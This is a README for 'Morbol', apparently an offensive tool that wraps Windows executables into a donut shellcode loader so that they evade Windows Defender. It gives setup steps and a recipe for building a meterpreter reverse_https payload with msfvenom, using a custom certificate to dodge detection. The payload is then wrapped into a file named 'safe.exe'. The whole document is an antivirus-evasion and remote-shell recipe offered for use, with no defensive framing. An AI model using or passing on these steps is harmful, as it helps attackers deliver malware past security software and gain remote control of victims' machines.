# Morbol

Wraps PE Files (PIE required) into a shellcode loader via donut. Note that this is meant for non interactive executeables that do not require arguments and do not generate any output that you want to obtain (e.g. won't work for Rubeus or Mimikatz, but does for msfvenom/cs beacons).

Please note that defender is now pretty good at detecting go loaders, so don't expect great results.

## Setup

```
go mod init morbol
go get golang.org/x/sys/windows@latest
pip3 install donut-shellcode
sudo apt-get install upx
```

## Usage

In my experience the only reliable way to evade defender with meterpreter is to use a reverse_https payload with a custom cert.

- Modify `/etc/ssl/openssl.cnf` so that `CipherString = DEFAULT`
- openssl req -new -x509 -nodes -out cert.crt -keyout priv.key
- set HandlerSSLCert on the server side listener

```
msfvenom -p windows/x64/meterpreter_reverse_https LHOST=... LPORT=...  HandlerSSLCert=... -f exe  > msf.exe
python3 morbol.py msf.exe safe.exe
```
